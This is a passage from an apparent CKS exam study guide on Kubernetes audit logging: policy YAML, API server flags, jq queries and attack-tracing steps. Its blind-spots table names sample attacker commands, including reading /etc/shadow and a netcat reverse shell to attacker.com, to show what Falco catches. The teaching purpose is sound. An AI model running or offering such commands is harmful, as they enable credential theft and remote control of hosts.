                <h4>What Audit Logs CANNOT See — Understanding the Blind Spots</h4>
                <p>Audit logs are comprehensive at the API level, but they have critical blind spots you must understand for the CKS exam:</p>
                <div class="comparison-table">
                    <table>
                        <thead><tr><th>What Happens</th><th>Does Audit Log See It?</th><th>Which Tool Covers This Gap?</th></tr></thead>
                        <tbody>
                            <tr><td>Attacker runs <code>cat /etc/shadow</code> inside a container after exec</td><td style="color:#326ce5;">❌ NO — happens INSIDE the container, not via API</td><td>🦅 Falco (Ch29) — detects file reads at syscall level</td></tr>
                            <tr><td>Attacker spawns a reverse shell: <code>nc -e /bin/bash attacker.com 4444</code></td><td style="color:#326ce5;">❌ NO — process execution inside container</td><td>🦅 Falco — detects spawned_process and network connections</td></tr>
                            <tr><td>Container writes to <code>/etc/crontab</code> for persistence</td><td style="color:#326ce5;">❌ NO — filesystem writes inside container</td><td>🦅 Falco — "Write below etc" rule</td></tr>
                            <tr><td>Attacker modifies a running pod's environment through <code>/proc</code></td><td style="color:#326ce5;">❌ NO — kernel-level manipulation</td><td>🦅 Falco + seccomp (Ch15) — syscall filtering</td></tr>
                            <tr><td>Data exfiltration via DNS tunneling</td><td style="color:#326ce5;">❌ NO — DNS queries don't touch API</td><td>🦅 Falco + NetworkPolicy (Ch6) — network monitoring</td></tr>
                        </tbody>
                    </table>
                </div>
                <p style="text-align:center;font-size:0.85rem;color:#8b949e;margin-top:0.5rem;"><strong>Key insight:</strong> Audit logs + Falco = complete visibility. Audit tells you HOW they got in. Falco tells you WHAT they're doing now. Neither alone is sufficient.</p>
            </section>

            <section class="section-block" id="s28-2">
                <h3 class="section-h">28.2 Configuring an Audit Policy — CKS Exam Must-Know</h3>
                <p>The audit policy is a YAML file that defines <strong>what gets logged and at what level</strong>. Rules are evaluated in order — <strong>first match wins</strong>. More specific rules must come before general rules. The policy is loaded by the API server via <code>--audit-policy-file</code>.</p>

                <h4>Audit Levels — How Much Detail to Capture</h4>
                <div class="comparison-table">
                    <table>
                        <thead><tr><th>Level</th><th>What It Logs</th><th>Use Case</th><th>Performance</th></tr></thead>
                        <tbody>
                            <tr><td><strong>None</strong></td><td>Nothing logged</td><td>System noise (kubelet heartbeats)</td><td>None</td></tr>
                            <tr><td><strong>Metadata</strong></td><td>Who, what, when, response code</td><td>Most requests — default level</td><td>Low</td></tr>
                            <tr><td><strong>Request</strong></td><td>Metadata + request body</td><td>Pod specs in create/update</td><td>Medium</td></tr>
                            <tr><td><strong>RequestResponse</strong></td><td>Metadata + request + response body</td><td>Secrets, RBAC, exec — maximum visibility</td><td>High</td></tr>
                        </tbody>
                    </table>
                </div>

                <h4>Decision Tree — Choosing the Right Audit Level</h4>
                <div class="decision-tree">
                    <div class="tree-title">Audit Level Selection — What Level for Which Resource?</div>
<pre>
  START: What resource is being accessed?
  │
  ├─ Is it a system component heartbeat? (kubelet, kube-proxy)
  │  └─ level: None (suppress noise, save disk)
  │
  ├─ Does it involve SECRET data? (secrets, configmaps with credentials)
  │  └─ level: RequestResponse (you need to see WHO accessed WHAT value)
  │
  ├─ Does it change RBAC permissions? (roles, clusterroles, bindings)
  │  └─ level: RequestResponse (privilege escalation is highest priority)
  │
  ├─ Does it involve pod exec/portforward/attach?
  │  └─ level: RequestResponse (interactive shell access must be fully logged)
  │
  ├─ Does it MUTATE workloads? (pod create/update/delete, deployment changes)
  │  └─ level: Request (see what was created, but skip large response bodies)
  │
  └─ Everything else (reads, lists, watches of non-sensitive resources)
     └─ level: Metadata (who accessed what, when — sufficient for audit trail)
</pre>
                </div>

                <h4>CKS-Ready Audit Policy — Complete Production Template</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">YAML — /etc/kubernetes/audit-policy.yaml — CKS exam-ready audit policy</span>
                    </div>
                    <pre><code class="language-yaml">apiVersion: audit.k8s.io/v1
kind: Policy
# FIRST MATCH WINS — most specific rules first!
omitStages: ["RequestReceived"]  # Only log final response events
rules:
  # ── SUPPRESS: System noise ──
  - level: None
    users: ["system:kube-proxy", "system:nodes"]
    verbs: ["get", "list", "watch"]
    resources:
    - group: ""
      resources: ["endpoints", "services", "nodes", "nodes/status"]

  # ── CRITICAL: Secrets at RequestResponse ──
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["secrets"]

  # ── CRITICAL: RBAC changes ──
  - level: RequestResponse
    resources:
    - group: "rbac.authorization.k8s.io"
      resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]

  # ── CRITICAL: Pod exec/portforward/attach ──
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["pods/exec", "pods/portforward", "pods/attach"]

  # ── IMPORTANT: Pod mutations at Request ──
  - level: Request
    resources:
    - group: ""
      resources: ["pods"]
    verbs: ["create", "update", "patch", "delete"]

  # ── DEFAULT: Everything else at Metadata ──
  - level: Metadata</code></pre>
                </div>

                <h4>API Server Configuration — Enabling Audit Logging with Rotation</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">YAML — kube-apiserver.yaml flags for audit logging with log rotation</span>
                    </div>
                    <pre><code class="language-yaml"># /etc/kubernetes/manifests/kube-apiserver.yaml
spec:
  containers:
  - name: kube-apiserver
    command:
    - kube-apiserver
    # ── AUDIT FLAGS ──
    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml
    - --audit-log-path=/var/log/kubernetes/audit.log
    - --audit-log-maxage=30        # Days to retain
    - --audit-log-maxbackup=10     # Max rotated files
    - --audit-log-maxsize=100      # MB per file before rotation
    # ── WEBHOOK (optional, for SIEM) ──
    - --audit-webhook-config-file=/etc/kubernetes/audit-webhook.yaml
    - --audit-webhook-mode=batch   # batch=async | blocking=sync
    volumeMounts:
    - name: audit-policy
      mountPath: /etc/kubernetes/audit-policy.yaml
      readOnly: true
    - name: audit-log
      mountPath: /var/log/kubernetes
  volumes:
  - name: audit-policy
    hostPath:
      path: /etc/kubernetes/audit-policy.yaml
      type: File
  - name: audit-log
    hostPath:
      path: /var/log/kubernetes
      type: DirectoryOrCreate</code></pre>
                </div>

                <h4>CKS Exam Common Mistakes — What Trips Up Candidates</h4>
                <div class="info-box warning">
                    <h5>⚠️ Top 5 Audit Policy Mistakes on the CKS Exam</h5>
                    <p><strong>1. Forgetting existing plugins:</strong> When adding <code>--audit-policy-file</code>, you must also include <code>--audit-log-path</code> and the volume mounts. All three are needed — missing any one means audit logging won't work. <strong>2. Wrong rule order:</strong> Putting the catch-all <code>level: Metadata</code> rule FIRST means NO rules after it will ever match. Always put the default rule LAST. <strong>3. Using RequestResponse for everything:</strong> This floods the audit log with response bodies (potentially megabytes each). Use RequestResponse ONLY for secrets, RBAC, and exec. <strong>4. Not excluding system noise:</strong> Without a <code>level: None</code> rule for kubelet/kube-proxy heartbeats, your audit log fills with thousands of useless events per minute. <strong>5. Forgetting volume mounts:</strong> The API server manifest needs BOTH the <code>--audit-policy-file</code> flag AND the volume mount to make the policy file accessible inside the container.</p>
                </div>

                <h4>Policy Rule Matching Walkthrough — Exactly How First-Match-Wins Works</h4>
                <div class="diagram-container">
                    <div class="diagram-title">Step-by-Step: How the API Server Evaluates Audit Policy Rules</div>
<pre>
  REQUEST: kubectl get secret easypj-db-creds -n easypj
  ─────────────────────────────────────────────────────

  API server iterates through rules IN ORDER:

  RULE 1: level=None, users=[system:kube-proxy, system:nodes]
    → User is "system:serviceaccount:easypj:deployer"
    → Does NOT match users list → SKIP to next rule

  RULE 2: level=RequestResponse, resources=[secrets]
    → Resource IS "secrets" → MATCH!
    → Audit event generated at RequestResponse level
    → STOP evaluating (first match wins!)

  RULES 3-7: NEVER EVALUATED (already matched at Rule 2)

  ─────────────────────────────────────────────────────
  REQUEST: kubectl get pods -n easypj

  RULE 1: Does NOT match (wrong user)
  RULE 2: Does NOT match (resource is pods, not secrets)
  RULE 3: Does NOT match (resource is pods, not RBAC)
  ...
  RULE 7 (DEFAULT): level=Metadata, no restrictions
    → Everything matches → Audit at Metadata level
    → STOP evaluating

  🔑 If the DEFAULT rule were FIRST, it would match EVERYTHING
     and NO other rules would ever be evaluated. This is the
     most common CKS exam mistake.
</pre>
                </div>
            </section>

            <section class="section-block" id="s28-3">
                <h3 class="section-h">28.3 Reading and Analyzing Audit Logs</h3>
                <p>Audit logs are <strong>JSON Lines</strong> (one JSON object per line) at <code>/var/log/kubernetes/audit.log</code>. Each line is a complete, self-contained audit event. You analyze them with <strong>jq</strong>, grep, or a SIEM.</p>

                <h4>jq Query Patterns — Security Event Extraction</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">Bash — jq queries for every security analysis scenario</span>
                    </div>
                    <pre><code class="language-bash"># ── Secret access ──
cat audit.log | jq 'select(.objectRef.resource=="secrets")'

# ── Failed requests (attack probes) ──
cat audit.log | jq 'select(.responseStatus.code >= 400)'

# ── Pod exec events ──
cat audit.log | jq 'select(.objectRef.subresource=="exec")'

# ── RBAC changes ──
cat audit.log | jq 'select(.objectRef.apiGroup=="rbac.authorization.k8s.io")'

# ── Events from specific user ──
cat audit.log | jq 'select(.user.username=="system:serviceaccount:easypj:deployer")'

# ── Key fields only (clean output) ──
cat audit.log | jq '{time: .stageTimestamp, user: .user.username, verb, resource: .objectRef.resource, ns: .objectRef.namespace, code: .responseStatus.code, ip: .sourceIPs[0]}'

# ── Time window ──
cat audit.log | jq 'select(.stageTimestamp >= "2026-06-14T03:00:00Z" and .stageTimestamp <= "2026-06-14T04:00:00Z")'

# ── Privilege escalation ──
cat audit.log | jq 'select(.objectRef.resource=="clusterrolebindings" or .objectRef.resource=="rolebindings")'

# ── Count events by user (anomaly detection) ──
cat audit.log | jq -r '.user.username' | sort | uniq -c | sort -rn</code></pre>
                </div>

                <h4>Tracing an Attack — From Alert to Full Reconstruction</h4>
                <div class="process-steps">
                    <div class="step"><span class="step-number">1</span><strong>Start with the alert</strong><p>Falco detected shell spawn in "crypto-miner" at 03:14:05. Note pod name + namespace.</p></div>
                    <div class="step"><span class="step-number">2</span><strong>Query for pod creation</strong><p><code>jq 'select(.verb=="create" and .objectRef.resource=="pods" and .objectRef.name=="crypto-miner")'</code> → reveals who, when, source IP.</p></div>
                    <div class="step"><span class="step-number">3</span><strong>Follow the user's trail</strong><p>Query ALL events from that user in the time window → exec, secret reads, configmap access, pod deletion.</p></div>
                    <div class="step"><span class="step-number">4</span><strong>Build the timeline</strong><p>Sort chronologically. Document: who, what, when, from where. This IS your incident report.</p></div>
                    <div class="step"><span class="step-number">5</span><strong>Fix root cause</strong><p>How did the SA get pod creation? Why wasn't admission blocking it? Fix RBAC, admission, monitoring.</p></div>
                </div>

                <h4>Real Audit Event — Annotated Walkthrough</h4>
                <div class="diagram-container">
                    <div class="diagram-title">Following the Trail — How One Audit Event Connects to the Next</div>
